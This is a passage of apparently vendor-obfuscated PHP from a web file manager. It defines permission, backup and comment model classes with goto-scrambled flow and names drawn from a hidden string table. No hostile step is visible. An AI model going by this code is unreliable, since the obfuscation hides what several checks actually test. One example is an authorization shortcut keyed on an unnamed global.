<?php
 goto d¹××À¡‚¦; CÆ³îõ¦: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $d’°¹ÙœŠ› =& $_SERVER[Õİõş]; $e„ñœ»ÕÛ = array(array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2081]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2083], $d’°¹ÙœŠ›[2084] => 6, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2087]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2088], $d’°¹ÙœŠ›[2084] => 1, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2089]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2090], $d’°¹ÙœŠ›[2084] => 2, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2091]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2090], $d’°¹ÙœŠ›[2084] => 3, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2092]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2093], $d’°¹ÙœŠ›[2084] => 4, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => self::AUTH_SHOW | self::AUTH_VIEW), array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2094]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2095], $d’°¹ÙœŠ›[2084] => 5, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($d’°¹ÙœŠ›[382] => LNG($d’°¹ÙœŠ›[2096]), $d’°¹ÙœŠ›[2082] => $d’°¹ÙœŠ›[2097], $d’°¹ÙœŠ›[2084] => 7, $d’°¹ÙœŠ›[2085] => 1, $d’°¹ÙœŠ›[2086] => 0)); return $e„ñœ»ÕÛ; } public static function authCheck($cë‡‰¡˜¶Ó, $BÜğ•Ôå†©) { $cë‡‰¡˜¶Ó = intval($cë‡‰¡˜¶Ó); if (_get($GLOBALS, $_SERVER[Õİõş][452])) { return !0; } if ($cë‡‰¡˜¶Ó <= 0) { return !1; } if (($cë‡‰¡˜¶Ó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cë‡‰¡˜¶Ó & $BÜğ•Ôå†©); } public static function authCheckShow($a‚±Ä–Ã«â) { return self::authCheck($a‚±Ä–Ã«â, self::AUTH_SHOW); } public static function authCheckView($eÃ³ÚÊÚ­¥) { return self::authCheck($eÃ³ÚÊÚ­¥, self::AUTH_VIEW); } public static function authCheckDownload($Aİìœââø) { return self::authCheck($Aİìœââø, self::AUTH_DOWNLOAD); } public static function authCheckUpload($dØ“¦ˆƒºß) { return self::authCheck($dØ“¦ˆƒºß, self::AUTH_UPLOAD); } public static function authCheckEdit($Eì¸ÁÔôèÌ) { return self::authCheck($Eì¸ÁÔôèÌ, self::AUTH_EDIT); } public static function authCheckRemove($b§±ó§ÏÅÊ) { return self::authCheck($b§±ó§ÏÅÊ, self::AUTH_REMOVE); } public static function authCheckShare($b‚æÉ›©í) { return self::authCheck($b‚æÉ›©í, self::AUTH_SHARE); } public static function authCheckComment($AÁ¬âóÏÆ) { return self::authCheck($AÁ¬âóÏÆ, self::AUTH_COMMENT); } public static function authCheckEvent($eÉ¦œ„·Ø…) { return self::authCheck($eÉ¦œ„·Ø…, self::AUTH_EVENT); } public static function authCheckRoot($fÓĞ„ñÁŸƒ) { return self::authCheck($fÓĞ„ñÁŸƒ, self::AUTH_ROOT); } public static function authDisable($fµ‘Õô¨Ø¹, $D¦¦¤˜Ğ°›) { if (intval($fµ‘Õô¨Ø¹) <= 0) { return 0; } return intval($fµ‘Õô¨Ø¹) & ~$D¦¦¤˜Ğ°›; } public $optionType = "\123\x79\x73\164\145\x6d\56\163\x6f\165\162\143\x65\101\165\x74\x68\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\141\165\164\x68", "\x6c\x61\142\x65\x6c", "\144\x69\x73\160\154\141\171", "\x73\x79\163\x74\x65\x6d", "\x73\x6f\162\x74"); public function initData() { $dŞÒ»Ğ…»Ø = $this->authDefault(); foreach ($dŞÒ»Ğ…»Ø as $eñ®Ş½éÙ) { $this->add($eñ®Ş½éÙ); } } public function listData($e¢‹¦ÍõÀÈ = false, $BÍë‡ùĞ¡Á = "\x73\157\162\x74", $EãùÂƒ‡ßğ = false) { return parent::listData($e¢‹¦ÍõÀÈ, $BÍë‡ùĞ¡Á, $EãùÂƒ‡ßğ); } public function update($dÌ»¡ö«¼Â, $F©Èëãäæ½) { $Dö¥ïŸàÚƒ =& $_SERVER[Õİõş]; $DØÏ­øÒØ = parent::listData($dÌ»¡ö«¼Â); $B÷‘¬ñÌÈ = $this->findByName($F©Èëãäæ½[$Dö¥ïŸàÚƒ[28]]); if (!$DØÏ­øÒØ || $B÷‘¬ñÌÈ && $B÷‘¬ñÌÈ[$Dö¥ïŸàÚƒ[363]] != $DØÏ­øÒØ[$Dö¥ïŸàÚƒ[363]]) { return !1; } $this->filterAuth($F©Èëãäæ½[$Dö¥ïŸàÚƒ[372]]); return parent::update($dÌ»¡ö«¼Â, $F©Èëãäæ½); } public function remove($AÇÅ³¹È“) { $Dïô…¥¯¹À = parent::listData($AÇÅ³¹È“); if (!$Dïô…¥¯¹À || $Dïô…¥¯¹À[$_SERVER[Õİõş][1083]]) { return !1; } return parent::remove($AÇÅ³¹È“); } public function add($eîÍ…ÔÎ = array()) { goto eÈæšÒè¹; eÈæšÒè¹: $bÆÜÇˆë‡ =& $_SERVER[Õİõş]; if ($this->findByName($eîÍ…ÔÎ[$bÆÜÇˆë‡[28]])) { return !1; } $c»«„Í¯ÛŒ = array($bÆÜÇˆë‡[28] => $bÆÜÇˆë‡[33], $bÆÜÇˆë‡[372] => 1, $bÆÜÇˆë‡[2098] => $bÆÜÇˆë‡[2099], $bÆÜÇˆë‡[2100] => 1, $bÆÜÇˆë‡[1083] => 0, $bÆÜÇˆë‡[2101] => 0); goto aª‹°Ï™‡«; aª‹°Ï™‡«: $eîÍ…ÔÎ = array_merge($c»«„Í¯ÛŒ, $eîÍ…ÔÎ); $eîÍ…ÔÎ[$bÆÜÇˆë‡[2101]] = $this->getSort(); $this->filterAuth($eîÍ…ÔÎ[$bÆÜÇˆë‡[372]]); goto DØÑ…ÁÒºØ; DØÑ…ÁÒºØ: return parent::insert($eîÍ…ÔÎ); goto CîÎÁê“—¹; CîÎÁê“—¹: } private function getSort() { $CÔí„ôÆÚ =& $_SERVER[Õİõş]; $B‰“Ã†Û = parent::listData(); $D†Š÷½†ª‹ = array_to_keyvalue($B‰“Ã†Û, $CÔí„ôÆÚ[33], $CÔí„ôÆÚ[2101]); return empty($D†Š÷½†ª‹) ? 0 : max($D†Š÷½†ª‹) + 1; } private function filterAuth(&$dÑ‘‚µ¥èÈ) { goto fˆ„ÎÍí«‹; f¤ğ–ñ‹Ê: foreach ($F†’Í©­Å as $e„ãÊßßÆì) { if (isset($f£·ò·£õÈ[$e„ãÊßßÆì])) { $F†’Í©­Å = array_merge($F†’Í©­Å, $f£·ò·£õÈ[$e„ãÊßßÆì]); } } $F†’Í©­Å[] = self::AUTH_SHOW; $dÑ‘‚µ¥èÈ = array_sum(array_unique($F†’Í©­Å)); goto F½…±•³µÙ; fˆ„ÎÍí«‹: if (!$dÑ‘‚µ¥èÈ) { return; } $FÙ‘Î¥¡ö = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $F†’Í©­Å = array(); goto BËŒ³ì¬Ïô; BËŒ³ì¬Ïô: foreach ($FÙ‘Î¥¡ö as $e„ãÊßßÆì) { if ($dÑ‘‚µ¥èÈ & $e„ãÊßßÆì) { $F†’Í©­Å[] = $e„ãÊßßÆì; } } if (in_array(self::AUTH_ROOT, $F†’Í©­Å)) { $dÑ‘‚µ¥èÈ = array_sum($FÙ‘Î¥¡ö); return; } $f£·ò·£õÈ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto f¤ğ–ñ‹Ê; F½…±•³µÙ: } public function sort($eÕµ†¯Üªµ, $f§ºÉŠ´‘•) { return parent::update($eÕµ†¯Üªµ, $f§ºÉŠ´‘•); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x62\x61\x63\153\x75\x70\x4c\x69\163\x74"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\163\164\x61\x74\165\163", "\x63\157\156\x74\145\156\164", "\x72\x65\x73\165\154\x74", "\x74\151\x6d\145\106\162\157\155", "\x74\151\155\145\124\157"); public function config() { goto b¹°ˆØ†©‹; c—­İùçî: if (isset($Dò‰ğàÈÄ¼[$dÙ½È•¨ÙÛ[186]])) { $Dò‰ğàÈÄ¼[$dÙ½È•¨ÙÛ[186]] = json_decode($Dò‰ğàÈÄ¼[$dÙ½È•¨ÙÛ[186]], !0); } if (isset($D°óÂ¶’¡[$dÙ½È•¨ÙÛ[186]])) { $Dò‰ğàÈÄ¼[$dÙ½È•¨ÙÛ[186]][$dÙ½È•¨ÙÛ[1392]] = $D°óÂ¶’¡[$dÙ½È•¨ÙÛ[186]]; unset($D°óÂ¶’¡[$dÙ½È•¨ÙÛ[186]]); } return array_merge($Dò‰ğàÈÄ¼, $D°óÂ¶’¡); goto FÓß½ĞÜˆ; f½ÁØòóÚ…: Action($dÙ½È•¨ÙÛ[2102])->taskInit(); $A§ÍòÔ¯›Œ = Model($dÙ½È•¨ÙÛ[2103])->listData(); foreach ($A§ÍòÔ¯›Œ as $d—…”„Ö£ë) { if ($d—…”„Ö£ë[$dÙ½È•¨ÙÛ[1083]] == $dÙ½È•¨ÙÛ[83] && $d—…”„Ö£ë[$dÙ½È•¨ÙÛ[1405]] == $dÙ½È•¨ÙÛ[2104]) { $Dò‰ğàÈÄ¼ = $d—…”„Ö£ë; break; } } goto c—­İùçî; d¼éÊ¤Ëª’: $D°óÂ¶’¡ = is_array($D°óÂ¶’¡) ? $D°óÂ¶’¡ : array(); if (!isset($D°óÂ¶’¡[$dÙ½È•¨ÙÛ[694]])) { $D°óÂ¶’¡[$dÙ½È•¨ÙÛ[694]] = $dÙ½È•¨ÙÛ[463]; } $Dò‰ğàÈÄ¼ = array(); goto f½ÁØòóÚ…; b¹°ˆØ†©‹: $dÙ½È•¨ÙÛ =& $_SERVER[Õİõş]; $D°óÂ¶’¡ = Model($dÙ½È•¨ÙÛ[1091])->get($dÙ½È•¨ÙÛ[714]); $D°óÂ¶’¡ = json_decode($D°óÂ¶’¡, !0); goto d¼éÊ¤Ëª’; FÓß½ĞÜˆ: } public function listData($EÊªª£Û«¨ = false, $cé®£‹¾‹ = "\155\x6f\144\151\146\171\124\151\155\x65", $Aˆ¹åÉä = false) { return parent::listData($EÊªª£Û«¨, $cé®£‹¾‹, !0); } public function lastItem() { $bŒæÜôİ±¢ = $this->listData(); return !empty($bŒæÜôİ±¢[0]) ? $bŒæÜôİ±¢[0] : null; } public function kill($cÃÀÁÅ«¾) { goto E§õÇÛÂ; a×èàƒ’¯…: return $this->remove($cÃÀÁÅ«¾); goto dŒÖ¾¨ŒŠ; Aôî—‡ŸÖÚ: $A÷æáÄ‘•é = $E†×…¯Îª‚[$a ñµéÜšñ[28]]; $cà¯Ë÷±§à = TEMP_FILES . $a ñµéÜšñ[712] . $A÷æáÄ‘•é . $a ñµéÜšñ[8]; IO::remove($cà¯Ë÷±§à, !1); goto a×èàƒ’¯…; E§õÇÛÂ: $a ñµéÜšñ =& $_SERVER[Õİõş]; $E†×…¯Îª‚ = $this->listData($cÃÀÁÅ«¾); if (!$E†×…¯Îª‚ || empty($E†×…¯Îª‚[$a ñµéÜšñ[28]])) { return !0; } goto a¨‡Òõ°¼; a¨‡Òõ°¼: Task::kill($a ñµéÜšñ[713]); Task::kill($a ñµéÜšñ[731]); Task::kill($a ñµéÜšñ[738]); goto Aôî—‡ŸÖÚ; dŒÖ¾¨ŒŠ: } public function remove($AôÎ´íßßâ) { $Dã´‰£‘Õ™ = $this->listData($AôÎ´íßßâ); if (!$Dã´‰£‘Õ™) { return !0; } return $this->backupRemove($Dã´‰£‘Õ™); } private function backupRemove($a—öÆÊÈŠì) { $CÕ¬’ë‡ñ¯ =& $_SERVER[Õİõş]; parent::remove($a—öÆÊÈŠì[$CÕ¬’ë‡ñ¯[363]]); $e—­¤¼òìÙ = "\x7b\151\x6f\x3a{$a—öÆÊÈŠì[$CÕ¬’ë‡ñ¯[693]]}\175\x2f\x64\141\x74\x61\142\141\163\x65\57\142\141\x63\153\165\x70\137" . $a—öÆÊÈŠì[$CÕ¬’ë‡ñ¯[28]]; IO::remove($e—­¤¼òìÙ, !1); return !0; } public function start() { goto FÃœù‘ÖÛ»; FÃœù‘ÖÛ»: $eÒÂ·Ü‘Şå =& $_SERVER[Õİõş]; if ($GLOBALS[$eÒÂ·Ü‘Şå[6]][$eÒÂ·Ü‘Şå[84]][$eÒÂ·Ü‘Şå[2105]] != $eÒÂ·Ü‘Şå[83]) { return !0; } $A¿é—££Ïè = $this->config(); goto A©¥°•×¹Ö; A©¥°•×¹Ö: if (!$A¿é—££Ïè || $A¿é—££Ïè[$eÒÂ·Ü‘Şå[1389]] != $eÒÂ·Ü‘Şå[83]) { return !1; } $d‡ìÏ¼×ì = $this->process(); foreach ($d‡ìÏ¼×ì as $Fé—¿Š‘š—) { if ($Fé—¿Š‘š—) { return Task::restart($Fé—¿Š‘š—[$eÒÂ·Ü‘Şå[363]]); } } goto Cİ‚òÍÕÕø; eä…áÔ±ÆÑ: if (!$dˆ‹·ôšÄö->dbFile()) { return !1; } if ($A¿é—££Ïè[$eÒÂ·Ü‘Şå[694]] == $eÒÂ·Ü‘Şå[463]) { $dˆ‹·ôšÄö->file(); } Backup::set(array($eÒÂ·Ü‘Şå[691] => 1, $eÒÂ·Ü‘Şå[705] => time())); goto BäÀŒ‡“‹; BäÀŒ‡“‹: return !0; goto E¡Ìˆé†´; Cİ‚òÍÕÕø: $dˆ‹·ôšÄö = new Backup(); $dˆ‹·ôšÄö->keep(); if (!$dˆ‹·ôšÄö->db()) { return !1; } goto eä…áÔ±ÆÑ; E¡Ìˆé†´: } public function process() { $c¯ŠÚÕÛ‡æ =& $_SERVER[Õİõş]; return array($c¯ŠÚÕÛ‡æ[696] => Task::get($c¯ŠÚÕÛ‡æ[713]), $c¯ŠÚÕÛ‡æ[699] => Task::get($c¯ŠÚÕÛ‡æ[731]), $c¯ŠÚÕÛ‡æ[163] => Task::get($c¯ŠÚÕÛ‡æ[738])); } public function restore() { $fĞÆ¾¿™Ù =& $_SERVER[Õİõş]; ActionCall($fĞÆ¾¿™Ù[2106], !0, 1); ActionCall($fĞÆ¾¿™Ù[2106], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\x65" => "\x63\157\x6d\155\x65\x6e\x74\x5f\x6d\x65\164\x61", "\x6d\x65\164\x61\x46\x69\x65\154\144" => "\143\157\x6d\155\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($CªôÍŠ¯ÚÍ) { $C»¬ÃØöõ =& $_SERVER[Õİõş]; if ($CªôÍŠ¯ÚÍ[$C»¬ÃØöõ[2107]]) { $f©ñ„ëÕĞ = $this->where(array($C»¬ÃØöõ[2108] => $CªôÍŠ¯ÚÍ[$C»¬ÃØöõ[2107]]))->find(); if (!$f©ñ„ëÕĞ || $f©ñ„ëÕĞ[$C»¬ÃØöõ[367]] != $CªôÍŠ¯ÚÍ[$C»¬ÃØöõ[367]] || $f©ñ„ëÕĞ[$C»¬ÃØöõ[451]] != $CªôÍŠ¯ÚÍ[$C»¬ÃØöõ[451]]) { return !1; } $this->where(array($C»¬ÃØöõ[2108] => $CªôÍŠ¯ÚÍ[$C»¬ÃØöõ[2107]]))->setAdd($C»¬ÃØöõ[2109], 1); } return $this->add($CªôÍŠ¯ÚÍ); } public function remove($cÎ«¸•öŸ) { $Eˆ¼½“©Ğ =& $_SERVER[Õİõş]; $eèÖ‚ùÙø = array($Eˆ¼½“©Ğ[2108] => $cÎ«¸•öŸ); $aà­Ô™Œ‘° = $this->where($eèÖ‚ùÙø)->find(); if ($aà­Ô™Œ‘°[$Eˆ¼½“©Ğ[2107]]) { $this->where(array($Eˆ¼½“©Ğ[2108] => $aà­Ô™Œ‘°[$Eˆ¼½“©Ğ[2107]]))->setAdd($Eˆ¼½“©Ğ[2109], -1); } return $this->where($eèÖ‚ùÙø)->delete(); } public function edit($eÛôÉƒ, $cçİ–¯‘) { $F‘Ä¯¬„í =& $_SERVER[Õİõş]; $d­Å‹ÃºÌ  = array($F‘Ä¯¬„í[2108] => $eÛôÉƒ); return $this->where($d­Å‹ÃºÌ )->save(array($F‘Ä¯¬„í[2110] => $cçİ–¯‘)); } public function prasise($bÅÌÇùºŸ‚) { $eöÖáùÊÏ =& $_SERVER[Õİõş]; $D óÖÍæš = Model($eöÖáùÊÏ[2111]); $BÌÌË…©Éˆ = array($eöÖáùÊÏ[2108] => $bÅÌÇùºŸ‚, $eöÖáùÊÏ[1408] => USER_ID); $A¥¸Ø”•´ = $D óÖÍæš->where($BÌÌË…©Éˆ)->find(); if (!$A¥¸Ø”•´) { $D óÖÍæš->add($BÌÌË…©Éˆ); $bŞ›¥§Ò¨Ö = $this->where(array($eöÖáùÊÏ[2108] => $bÅÌÇùºŸ‚))->setAdd($eöÖáùÊÏ[2112], 1); } else { $D óÖÍæš->where($BÌÌË…©Éˆ)->delete(); $bŞ›¥§Ò¨Ö = $this->where(array($eöÖáùÊÏ[2108] => $bÅÌÇùºŸ‚))->setAdd($eöÖáùÊÏ[2112], -1); } return $bŞ›¥§Ò¨Ö; } public function targetInfo($A‹Œ£³Ëğá, $C†ÜîÅœÈÅ) { goto E°æ‰Ÿê¡î; c¶ªÁÁ¾à¡: return $Få®Š†ğ»ñ; goto B¨Á¹ÌØá·; Bñ½‚³É¢: $C¤»ß­Ãï = "\x52\x49\x47\110\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\x74\137\x70\162\141\x69\163\x65\40\163\164\x61\162\x20\x6f\156\x20\x63\157\x6d\x6d\145\x6e\164\56\143\x6f\x6d\x6d\x65\156\x74\111\x44\40\75\40\x73\x74\141\162\56\143\x6f\155\155\145\156\x74\x49\x44"; $eßæ÷ÔÎ°¬ = $this->alias($a”Š‹†Ï“[337])->where($cÙÉ‡¸Ï)->join($C¤»ß­Ãï, $a”Š‹†Ï“[2113])->count(); $Få®Š†ğ»ñ = array($a”Š‹†Ï“[2114] => $EäÏŒãóç¼, $a”Š‹†Ï“[2115] => $eßæ÷ÔÎ°¬); goto c¶ªÁÁ¾à¡; E°æ‰Ÿê¡î: $a”Š‹†Ï“ =& $_SERVER[Õİõş]; $cÙÉ‡¸Ï = array($a”Š‹†Ï“[516] => $A‹Œ£³Ëğá, $a”Š‹†Ï“[517] => $C†ÜîÅœÈÅ); $EäÏŒãóç¼ = $this->where($cÙÉ‡¸Ï)->count(); goto Bñ½‚³É¢; B¨Á¹ÌØá·: } public function listData($c°†±ÇæÜ˜) { $aºË†šŸ„ =& $_SERVER[Õİõş]; if (isset($c°†±ÇæÜ˜[$aºË†šŸ„[2116]])) { if ($c°†±ÇæÜ˜[$aºË†šŸ„[2116]]) { $c°†±ÇæÜ˜[$aºË†šŸ„[2117]] = array($aºË†šŸ„[932], intval($c°†±ÇæÜ˜[$aºË†šŸ„[2116]])); } unset($c°†±ÇæÜ˜[$aºË†šŸ„[2116]]); } if (isset($c°†±ÇæÜ˜[$aºË†šŸ„[2118]])) { if ($c°†±ÇæÜ˜[$aºË†šŸ„[2118]]) { $c°†±ÇæÜ˜[$aºË†šŸ„[2117]] = array($aºË†šŸ„[929], intval($c°†±ÇæÜ˜[$aºË†šŸ„[2118]])); } unset($c°†±ÇæÜ˜[$aºË†šŸ„[2118]]); } return $this->_listData($c°†±ÇæÜ˜); } private function _listData($bà»È™¤) { $A‰â†°¸õ¼ =& $_SERVER[Õİõş]; $a‚‹»¥¯Ş  = $this->where($bà»È™¤)->_makeOrder()->selectPage(100); $this->_listAppendParent($a‚‹»¥¯Ş [$A‰â†°¸õ¼[350]]); $this->_listAppendUser($a‚‹»¥¯Ş [$A‰â†°¸õ¼[350]]); $this->_listAppendMeta($a‚‹»¥¯Ş [$A‰â†°¸õ¼[350]]); return $a‚‹»¥¯Ş ; } private function _makeOrder() { $FÄÍÎÍÒğ =& $_SERVER[Õİõş]; $Fµï•’“¼Î = array($FÄÍÎÍÒğ[2112], $FÄÍÎÍÒğ[2109], $FÄÍÎÍÒğ[183]); $bˆÂå¢Ï¾ = Input::get($FÄÍÎÍÒğ[402], $FÄÍÎÍÒğ[7], $FÄÍÎÍÒğ[385], $Fµï•’“¼Î); $D”¨’‰‹¼† = Input::get($FÄÍÎÍÒğ[403], $FÄÍÎÍÒğ[7], $FÄÍÎÍÒğ[1410], array($FÄÍÎÍÒğ[2119], $FÄÍÎÍÒğ[400])); $bÉ»÷©®«Ö = $bˆÂå¢Ï¾ . $FÄÍÎÍÒğ[50] . $D”¨’‰‹¼†; return $this->order($bÉ»÷©®«Ö); } private function _listAppendParent(&$Eè“¸¶íŸà) { goto aö¶‡Äƒ‡á; bˆÎ„ÊáÄ: if (!$b”ƒ¶œùÏ) { return; } $F¯¬È²ÍÛñ = $this->where(array($E¦»×çÎÜœ[2108] => array($E¦»×çÎÜœ[7], $b”ƒ¶œùÏ)))->select(); $F¯¬È²ÍÛñ = array_to_keyvalue($F¯¬È²ÍÛñ, $E¦»×çÎÜœ[2117]); goto f¾¶¡ƒæ; aö¶‡Äƒ‡á: $E¦»×çÎÜœ =& $_SERVER[Õİõş]; $b”ƒ¶œùÏ = array_unique(array_to_keyvalue($Eè“¸¶íŸà, $E¦»×çÎÜœ[33], $E¦»×çÎÜœ[2107])); $b”ƒ¶œùÏ = array_remove_value($b”ƒ¶œùÏ, $E¦»×çÎÜœ[463]); goto bˆÎ„ÊáÄ; f¾¶¡ƒæ: foreach ($Eè“¸¶íŸà as &$F¨ïâ¦ßÚá) { if (isset($F¯¬È²ÍÛñ[$F¨ïâ¦ßÚá[$E¦»×çÎÜœ[2107]]])) { $F¨ïâ¦ßÚá[$E¦»×çÎÜœ[2120]] = $F¯¬È²ÍÛñ[$F¨ïâ¦ßÚá[$E¦»×çÎÜœ[2107]]]; } } goto cÙ¡¸¡†ÕÀ; cÙ¡¸¡†ÕÀ: } private function _listAppendUser(&$eÁŞÔĞ‰ì) { goto D–ÀØê‚; FğíùÉäĞ©: if (count($D˜¶‚Œ¶ó) == 0) { return; } foreach ($eÁŞÔĞ‰ì as $f§§ÜÄİ·) { if (isset($f§§ÜÄİ·[$e¡õ¸Ì¿­‚[2120]])) { $D˜¶‚Œ¶ó[] = $f§§ÜÄİ·[$e¡õ¸Ì¿­‚[2120]][$e¡õ¸Ì¿­‚[1417]]; } } $B¯®Ëé»© = Model($e¡õ¸Ì¿­‚[472])->userListInfo($D˜¶‚Œ¶ó); goto Bì‡âå¶ˆ; Bì‡âå¶ˆ: foreach ($eÁŞÔĞ‰ì as &$f§§ÜÄİ·) { $f§§ÜÄİ·[$e¡õ¸Ì¿­‚[530]] = $B¯®Ëé»©[$f§§ÜÄİ·[$e¡õ¸Ì¿­‚[1417]]]; if (isset($f§§ÜÄİ·[$e¡õ¸Ì¿­‚[2120]])) { $f§§ÜÄİ·[$e¡õ¸Ì¿­‚[2120]][$e¡õ¸Ì¿­‚[530]] = $B¯®Ëé»©[$f§§ÜÄİ·[$e¡õ¸Ì¿­‚[2120]][$e¡õ¸Ì¿­‚[1417]]]; } } goto Cšâ¨ËÅö´; D–ÀØê‚: $e¡õ¸Ì¿­‚ =& $_SERVER[Õİõş]; $D˜¶‚Œ¶ó = array_unique(array_to_keyvalue($eÁŞÔĞ‰ì, $e¡õ¸Ì¿­‚[33], $e¡õ¸Ì¿­‚[1417])); $D˜¶‚Œ¶ó = array_remove_value($D˜¶‚Œ¶ó, $e¡õ¸Ì¿­‚[463]); goto FğíùÉäĞ©; Cšâ¨ËÅö´: } private function _listAppendMeta(&$C‡’›Œ›Õ¨) { goto AµšËî›; e”åù¥…°Ÿ: if (!$FëƒÓ«Øùà) { return; } foreach ($C‡’›Œ›Õ¨ as $eïØ´á§¹—) { if (isset($eïØ´á§¹—[$A×¯¾”åŠİ[2120]])) { $FëƒÓ«Øùà[] = $eïØ´á§¹—[$A×¯¾”åŠİ[2120]][$A×¯¾”åŠİ[2117]]; } } $D¢‰Ó¬¬Û» = $this->metaList($FëƒÓ«Øùà); goto fîƒ«–Ú¶ø; fîƒ«–Ú¶ø: if (!$D¢‰Ó¬¬Û») { return !1; } foreach ($C‡’›Œ›Õ¨ as &$eïØ´á§¹—) { $eïØ´á§¹—[$A×¯¾”åŠİ[412]] = $D¢‰Ó¬¬Û»[$eïØ´á§¹—[$A×¯¾”åŠİ[2117]]]; if (isset($eïØ´á§¹—[$A×¯¾”åŠİ[2120]])) { $eïØ´á§¹—[$A×¯¾”åŠİ[2120]][$A×¯¾”åŠİ[412]] = $D¢‰Ó¬¬Û»[$eïØ´á§¹—[$A×¯¾”åŠİ[2120]][$A×¯¾”åŠİ[2117]]]; } } goto cÄéÈ¨ëÆÁ; AµšËî›: $A×¯¾”åŠİ =& $_SERVER[Õİõş]; $FëƒÓ«Øùà = array_unique(array_to_keyvalue($C‡’›Œ›Õ¨, $A×¯¾”åŠİ[33], $A×¯¾”åŠİ[2117])); $FëƒÓ«Øùà = array_remove_value($FëƒÓ«Øùà, $A×¯¾”åŠİ[463]); goto e”åù¥…°Ÿ; cÄéÈ¨ëÆÁ: } private function metaList($bŞŞ©ØÁ) { goto AÇ¯‚›©†Ç; AÇ¯‚›©†Ç: $a‹åŞ—Óöö =& $_SERVER[Õİõş]; if (!$bŞŞ©ØÁ) { return array(); } $EŒ£–ÏìêÜ = array($a‹åŞ—Óöö[2117] => array($a‹åŞ—Óöö[7], $bŞŞ©ØÁ)); goto FÁ¶ˆª; DÚí„Õ Ñ…: return $dºÈÈò‘Ã£ ? $dºÈÈò‘Ã£ : array(); goto Bª´…ùîµï; FÁ¶ˆª: $dºÈÈò‘Ã£ = Model($a‹åŞ—Óöö[2121])->where($EŒ£–ÏìêÜ)->select(); $dºÈÈò‘Ã£ = array_to_keyvalue_group($dºÈÈò‘Ã£, $a‹åŞ—Óöö[2117]); foreach ($dºÈÈò‘Ã£ as $d‘·İé¸Ô× => $AÀòè¾å²) { $AÂØ»š—Ï = array(); foreach ($AÀòè¾å² as $c¡÷“Ë³ñ) { $AÂØ»š—Ï[$c¡÷“Ë³ñ[$a‹åŞ—Óöö[89]]] = $c¡÷“Ë³ñ[$a‹åŞ—Óöö[355]]; } $dºÈÈò‘Ã£[$d‘·İé¸Ô×] = $AÂØ»š—Ï; } goto DÚí„Õ Ñ…; Bª´…ùîµï: } } goto Bìßª½ãÃ; A‰æ§É¿Â: define($_SERVER[Õİõş][1912], 5); define($_SERVER[Õİõş][1913], 16); define($_SERVER[Õİõş][1914], 32); goto dÆ¹Š›ì¬; BÑÆÔ‰¸Ï±: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\141\147\114\x69\163\164"; public $modelType = "\125\163\145\x72\117\x70\164\151\157\156"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x79\154\x65", "\163\157\162\x74"); public function 